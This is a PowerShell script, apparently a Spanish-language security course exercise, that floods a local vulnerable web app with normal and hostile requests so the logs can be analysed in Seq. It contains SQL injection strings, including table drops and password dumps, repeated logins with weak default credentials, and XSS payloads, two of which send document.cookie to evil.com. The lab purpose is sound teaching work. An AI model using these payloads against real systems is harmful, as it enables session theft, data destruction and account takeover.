# ============================================================
# Script de generacion de trafico - SEGG-U2-P3G-5
# Genera el volumen completo de pruebas requerido contra
# VulnerableApp corriendo localmente.
#
# IMPORTANTE: ajusta $baseUrl al puerto real que muestra
# "dotnet run" en la consola (ej. http://localhost:5192)
# ============================================================

$baseUrl = "http://localhost:5271"   # <-- AJUSTA ESTE PUERTO

$session = $null
$ok = 0
$fail = 0

function Invoke-Safe {
    param(
        [string]$Method = "GET",
        [string]$Url,
        [hashtable]$Body = $null,
        [switch]$UseSession
    )
    try {
        $params = @{
            Uri             = $Url
            Method          = $Method
            UseBasicParsing = $true
            TimeoutSec      = 10
        }
        if ($Body) { $params.Body = $Body }
        if ($UseSession) {
            if ($session) { $params.WebSession = $session }
            else { $params.SessionVariable = "newSession" }
        }
        $resp = Invoke-WebRequest @params -ErrorAction Stop
        if ($UseSession -and -not $session -and $newSession) { $script:session = $newSession }
        $script:ok++
        return $resp
    }
    catch {
        $script:fail++
        return $_.Exception.Response
    }
}

function Get-AntiForgeryToken {
    param([string]$Html)
    if ($Html -match 'name="__RequestVerificationToken"\s+type="hidden"\s+value="([^"]+)"') {
        return $matches[1]
    }
    return $null
}

Write-Host "=== Iniciando generacion de trafico contra $baseUrl ===" -ForegroundColor Cyan

# ---------- 1. NAVEGACION GENERAL ----------
Write-Host "`n[1/7] Navegacion general (30x home + todos los controladores)..." -ForegroundColor Yellow
for ($i = 1; $i -le 30; $i++) {
    Invoke-Safe -Url "$baseUrl/" -UseSession | Out-Null
}
Invoke-Safe -Url "$baseUrl/Home/Privacy" -UseSession | Out-Null
Invoke-Safe -Url "$baseUrl/Auth/Login" -UseSession | Out-Null
Invoke-Safe -Url "$baseUrl/Search/Index" -UseSession | Out-Null
Invoke-Safe -Url "$baseUrl/Comment/Index" -UseSession | Out-Null
Invoke-Safe -Url "$baseUrl/api/users" -UseSession | Out-Null

# ---------- 2. BUSQUEDAS ----------
Write-Host "[2/7] Busquedas (100 validas + 20 vacias + 20 caracteres especiales + 20 SQLi)..." -ForegroundColor Yellow

$validTerms = @('admin','user1','user2','test','maria','carlos','ana','luis','john','seq')
for ($i = 1; $i -le 100; $i++) {
    $term = $validTerms[$i % $validTerms.Count]
    Invoke-Safe -Url "$baseUrl/Search/Index?search=$term" -UseSession | Out-Null
}

for ($i = 1; $i -le 20; $i++) {
    Invoke-Safe -Url "$baseUrl/Search/Index?search=" -UseSession | Out-Null
}

$specialChars = @('!@#$%','<>?/','''"','(){}[]','%00%01','----','****','<>&;','||&&','NULL')
for ($i = 1; $i -le 20; $i++) {
    $term = [uri]::EscapeDataString($specialChars[$i % $specialChars.Count])
    Invoke-Safe -Url "$baseUrl/Search/Index?search=$term" -UseSession | Out-Null
}

$sqliTerms = @(
    "' OR 1=1--", "' OR '1'='1", "'; DROP TABLE Users--", "' UNION SELECT * FROM Users--",
    "admin'--", "1' OR '1'='1' /*", "' OR 'a'='a", "xp_cmdshell", "'; SELECT * FROM Users;--",
    "' UNION SELECT username, password FROM Users--"
)
for ($i = 1; $i -le 20; $i++) {
    $term = [uri]::EscapeDataString($sqliTerms[$i % $sqliTerms.Count])
    Invoke-Safe -Url "$baseUrl/Search/Index?search=$term" -UseSession | Out-Null
}

# ---------- 3. AUTENTICACION ----------
Write-Host "[3/7] Autenticacion (50 exitosos + 100 fallidos)..." -ForegroundColor Yellow

$validUsers = @(
    @{u="admin"; p="admin"},
    @{u="user1"; p="123456"},
    @{u="user2"; p="password"}
)
for ($i = 1; $i -le 50; $i++) {
    $cred = $validUsers[$i % $validUsers.Count]
    Invoke-Safe -Method POST -Url "$baseUrl/Auth/Login" -Body @{ username = $cred.u; password = $cred.p } -UseSession | Out-Null
}

$invalidCombos = @(
    @{u="admin"; p="wrongpass"},
    @{u="user1"; p="incorrecto"},
    @{u="user2"; p="12345"},
    @{u="noexiste"; p="cualquiera"},
    @{u="hacker"; p="hacker123"},
    @{u="root"; p="root"},
    @{u="test"; p="test"},
    @{u="admin"; p=""}
)
for ($i = 1; $i -le 100; $i++) {
    $cred = $invalidCombos[$i % $invalidCombos.Count]
    Invoke-Safe -Method POST -Url "$baseUrl/Auth/Login" -Body @{ username = $cred.u; password = $cred.p } -UseSession | Out-Null
}

# ---------- 4. COMENTARIOS ----------
Write-Host "[4/7] Comentarios (100 validos + 30 XSS)..." -ForegroundColor Yellow

$commentPage = Invoke-Safe -Url "$baseUrl/Comment/Index" -UseSession
$token = if ($commentPage -and $commentPage.Content) { Get-AntiForgeryToken -Html $commentPage.Content } else { $null }

if (-not $token) {
    Write-Host "  ADVERTENCIA: no se pudo extraer el token CSRF, los POST de comentarios podrian fallar con 400." -ForegroundColor Red
}

$validComments = @(
    "Excelente aplicacion, muy util.",
    "Tuve un problema al iniciar sesion.",
    "Gracias por el soporte.",
    "Buena interfaz de usuario.",
    "Podrian mejorar el tiempo de respuesta.",
    "Todo funciono correctamente.",
    "Necesito ayuda con mi cuenta.",
    "Muy buen servicio en general."
)
for ($i = 1; $i -le 100; $i++) {
    $comment = $validComments[$i % $validComments.Count] + " #$i"
    $body = @{ comment = $comment }
    if ($token) { $body["__RequestVerificationToken"] = $token }
    Invoke-Safe -Method POST -Url "$baseUrl/Comment/AddComment" -Body $body -UseSession | Out-Null
}

$xssPayloads = @(
    '<script>alert(1)</script>',
    '<img src=x onerror=alert(1)>',
    '<svg onload=alert(1)>',
    'javascript:alert(document.cookie)',
    '<iframe src=javascript:alert(1)>',
    '<body onload=alert(1)>',
    '<a href=javascript:alert(1)>click</a>',
    '''-alert(1)-''',
    '<script>document.location=''http://evil.com/''+document.cookie</script>',
    '<img src=x onerror=this.src=''http://evil.com/steal?c=''+document.cookie>'
)
for ($i = 1; $i -le 30; $i++) {
    $payload = $xssPayloads[$i % $xssPayloads.Count]
    $body = @{ comment = $payload }
    if ($token) { $body["__RequestVerificationToken"] = $token }
    Invoke-Safe -Method POST -Url "$baseUrl/Comment/AddComment" -Body $body -UseSession | Out-Null
}

# Warnings extra: comentarios vacios (cuentan tambien para el requisito de 20+ Warnings)
for ($i = 1; $i -le 10; $i++) {
    $body = @{ comment = "" }
    if ($token) { $body["__RequestVerificationToken"] = $token }
    Invoke-Safe -Method POST -Url "$baseUrl/Comment/AddComment" -Body $body -UseSession | Out-Null
}

# ---------- 5. API ----------
Write-Host "[5/7] API (200+ consumos, incluyendo IDs inexistentes/invalidos)..." -ForegroundColor Yellow

for ($i = 1; $i -le 100; $i++) {
    $id = ($i % 3) + 1   # IDs validos 1,2,3
    Invoke-Safe -Url "$baseUrl/api/user/$id" -UseSession | Out-Null
}
for ($i = 1; $i -le 60; $i++) {
    Invoke-Safe -Url "$baseUrl/api/users" -UseSession | Out-Null
}
for ($i = 1; $i -le 25; $i++) {
    $id = 9000 + $i   # IDs inexistentes
    Invoke-Safe -Url "$baseUrl/api/user/$id" -UseSession | Out-Null
}
for ($i = 1; $i -le 15; $i++) {
    Invoke-Safe -Url "$baseUrl/api/user/abc$i" -UseSession | Out-Null   # IDs invalidos (no numericos)
}

# ---------- 6. EXCEPCIONES ----------
Write-Host "[6/7] Excepciones (20 controladas + 10 no controladas)..." -ForegroundColor Yellow

for ($i = 1; $i -le 10; $i++) {
    Invoke-Safe -Url "$baseUrl/api/test/controlled-error" -UseSession | Out-Null
}
for ($i = 1; $i -le 10; $i++) {
    Invoke-Safe -Url "$baseUrl/Search/Index?search=__test_controlled_error__" -UseSession | Out-Null
}
for ($i = 1; $i -le 10; $i++) {
    Invoke-Safe -Url "$baseUrl/api/test/uncontrolled-error" -UseSession | Out-Null
}

# ---------- 7. WARNINGS ADICIONALES ----------
Write-Host "[7/7] Warnings adicionales (busquedas vacias ya cuentan, mas variantes)..." -ForegroundColor Yellow
for ($i = 1; $i -le 15; $i++) {
    Invoke-Safe -Url "$baseUrl/Search/Index?search=" -UseSession | Out-Null
}

Write-Host "`n=== COMPLETADO ===" -ForegroundColor Green
Write-Host "Peticiones exitosas (2xx/redirect): $ok"
Write-Host "Peticiones con error/status no-2xx (esperado para pruebas negativas): $fail"
Write-Host "`nRevisa Seq (http://localhost:8081) y la carpeta Logs para el analisis." -ForegroundColor Cyan